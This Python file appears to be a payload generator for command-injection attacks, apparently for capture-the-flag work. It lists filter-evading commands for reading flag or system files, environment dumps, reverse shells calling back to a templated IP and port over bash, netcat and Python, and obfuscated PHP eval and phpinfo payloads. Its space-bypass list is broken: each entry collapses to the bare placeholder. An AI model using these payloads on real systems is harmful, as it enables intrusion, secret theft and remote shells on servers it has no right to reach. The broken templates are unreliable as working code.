READFILE_TEMPLATES = [
    "cat {path}",
    "tac {path}",
    "nl {path}",
    "more {path}",
    "less {path}",
    "head {path}",
    "tail {path}",
    "sort {path}",
    "od -An -c {path}",
    "strings {path}",
    "paste {path}",
    "grep '.*' {path}",
    "sed -n '1,200p' {path}",
    "rev {path}",
    "uniq {path}",
    "base64 {path}",
    "mv {path} {path}.txt",
    "cp {path} /tmp/flag.txt",
    "awk '1' {path}",
    "diff / {path}",
    "dd if={path}",
    "ls {path}",
    "ca\\t {path}",
    "ca''t {path}",
    "a=ca;b=t;$a$b {path}",
    "b=l;c=s;d={path};$b$c $d",
    "echo `tac {path}`",
    "print(`cat {path}`)",
    "show_source('{path}')",
    "highlight_file('{path}')",
    "readgzfile('{path}')",
]

READ_ENV_TEMPLATES = [
    "env",
    "printenv",
    "set",
]

REFLECT_SHELL_TEMPLATES = [
    "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
    "nc {ip} {port} -e /bin/sh",
    "busybox nc {ip} {port} -e /bin/sh",
    "python -c 'import os,pty,socket; s=socket.socket(); s.connect((\"{ip}\",{port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn(\"/bin/sh\")'",
]

PHPINFO_TEMPLATES = [
    "php -r 'phpinfo();'",
    "phpinfo();",
    "(~%8F%97%8F%96%91%99%90)();",
    "$_=(%ff%ff%ff%ff^%a0%b8%ba%ab);$_();",
    "eval(pos(get_defined_vars()));",
    "print_r(getallheaders());",
    "show_source(scandir(getcwd())[2]);",
    "show_source(current(array_reverse(scandir(getcwd()))));",
]

# Space Bypass Templates
SPACE_BYPASS_TEMPLATES = [
    "{payload}".replace(" ", "${IFS}"),
    "{payload}".replace(" ", "$IFS$9"),
    "{payload}".replace(" ", "/**/"),
    "{payload}".replace(" ", "<>"),
    "{payload}".replace(" ", "<"),
    "{payload}".replace(" ", "%20"),
    "{payload}".replace(" ", "%09"),
    "{payload}".replace(" ", "%a0"),
]
